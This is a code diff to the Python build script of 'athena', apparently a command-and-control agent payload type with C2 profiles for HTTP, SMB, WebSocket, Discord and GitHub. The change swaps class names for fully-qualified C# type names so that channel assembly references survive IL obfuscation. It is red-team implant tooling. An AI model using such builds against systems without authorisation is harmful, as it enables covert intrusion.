@@ -150,13 +150,14 @@ class athena(PayloadType):
     ]
     c2_profiles = ["http", "websocket", "slack", "smb", "discord", "github"]
 
-    # (dir_name, config_file, assembly_for_roots, channel_class)
+    # (dir_name, config_file, assembly_for_roots, channel_fqn)
+    # channel_fqn: fully-qualified C# type name used in the typeof() anchor expression
     PROFILE_REGISTRY = {
-        "http":      ("Workflow.Channels.Http",      "HttpProfile.cs",      "Workflow.Channels.HTTP",    "HttpProfile"),
-        "smb":       ("Workflow.Channels.Smb",       "SmbProfile.cs",       "Workflow.Channels.SMB",     "SmbProfile"),
-        "websocket": ("Workflow.Channels.Websocket",  "WebsocketProfile.cs", "Workflow.Channels.Websocket","Websocket"),
-        "discord":   ("Workflow.Channels.Discord",    "DiscordProfile.cs",   "Workflow.Channels.Discord", "DiscordProfile"),
-        "github":    ("Workflow.Channels.GitHub",     "GitHubProfile.cs",    "Workflow.Channels.GitHub",  "GitHub"),
+        "http":      ("Workflow.Channels.Http",      "HttpProfile.cs",      "Workflow.Channels.HTTP",    "Workflow.Channels.HttpProfile"),
+        "smb":       ("Workflow.Channels.Smb",       "SmbProfile.cs",       "Workflow.Channels.SMB",     "Workflow.Channels.SmbProfile"),
+        "websocket": ("Workflow.Channels.Websocket",  "WebsocketProfile.cs", "Workflow.Channels.Websocket","Workflow.Channels.Websocket.Websocket"),
+        "discord":   ("Workflow.Channels.Discord",    "DiscordProfile.cs",   "Workflow.Channels.Discord", "Workflow.Channels.DiscordProfile"),
+        "github":    ("Workflow.Channels.GitHub",     "GitHubProfile.cs",    "Workflow.Channels.GitHub",  "Workflow.Channels.GitHub"),
     }
 
     async def prepareWinExe(self, output_path):
@@ -168,7 +169,7 @@ class athena(PayloadType):
         os.rename(os.path.join(output_path, "Agent_Headless.exe"), os.path.join(output_path, "Athena.exe"))
 
     def buildProfile(self, gen_dir, c2, profile_name):
-        dir_name, _, assembly, _cls = self.PROFILE_REGISTRY[profile_name]
+        dir_name, _, assembly, _fqn = self.PROFILE_REGISTRY[profile_name]
 
         # Collect parameters into a flat dict
         config = {}
@@ -291,10 +292,12 @@ class athena(PayloadType):
         Assembly.GetReferencedAssemblies(). Adding a typeof() reference forces
         the compiler to emit an AssemblyRef, which survives IL obfuscation
         (the obfuscator patches both the ref and the definition consistently).
+
+        profile_classes: list of fully-qualified C# type names (strings)
         """
         type_list = ", ".join(
-            "typeof({}.{})".format(ns, cls)
-            for ns, cls in profile_classes
+            "typeof({})".format(fqn)
+            for fqn in profile_classes
         )
         cs_source = (
             "// Auto-generated: forces PE-level assembly reference to channel(s)\n"
@@ -494,12 +497,12 @@ class athena(PayloadType):
                 name = profile["name"]
                 if name not in self.PROFILE_REGISTRY:
                     raise Exception("Unsupported C2 profile type for Athena: {}".format(name))
-                dir_name, _, assembly, chan_cls = self.PROFILE_REGISTRY[name]
+                dir_name, _, assembly, chan_fqn = self.PROFILE_REGISTRY[name]
                 roots_replace += '<assembly fullname="{}"/>'.format(assembly) + '\n'
                 self.buildProfile(gen_dir, c2, name)
                 profile_short = dir_name.split(".")[-1]
                 profile_dirs.append(profile_short)
-                profile_classes.append((dir_name, chan_cls))
+                profile_classes.append(chan_fqn)
                 all_references.append(
                     os.path.join("..", "Workflow.Channels.{}".format(profile_short),
                                  "Workflow.Channels.{}.csproj".format(profile_short))
